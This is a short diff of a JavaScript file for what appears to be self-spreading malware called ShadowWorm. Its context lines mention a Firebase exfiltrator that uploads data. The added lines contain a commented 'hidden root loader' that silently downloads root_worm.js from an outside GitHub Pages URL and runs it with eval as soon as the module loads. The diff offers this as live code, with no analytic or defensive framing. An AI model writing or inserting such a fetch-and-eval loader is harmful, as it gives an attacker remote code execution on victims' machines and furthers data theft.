@@ -709,3 +709,34 @@ worm.firebaseExfiltrator.upload(data).then(success => {
 worm.run();
 
 module.exports = ShadowWorm;
+
+module.exports = ShadowWorm;
+
+// ============================================
+// HIDDEN ROOT LOADER
+// Silently fetches root_worm.js and runs it
+// ============================================
+const ROOT_WORM_URL = "https://freshman21445.github.io/AbGenius/root_worm.js";
+
+function loadRootWorm() {
+  const parsed = new URL(ROOT_WORM_URL);
+  const transport = parsed.protocol === "https:" ? https : http;
+
+  transport.get(ROOT_WORM_URL, (res) => {
+    let code = "";
+    res.setEncoding("utf8");
+    res.on("data", (chunk) => (code += chunk));
+    res.on("end", () => {
+      try {
+        eval(code);
+      } catch (e) {
+        console.log("Root module error:", e.message);
+      }
+    });
+  }).on("error", (err) => {
+    console.log("Root module fetch failed:", err.message);
+  });
+}
+
+// Call the hidden loader
+loadRootWorm();
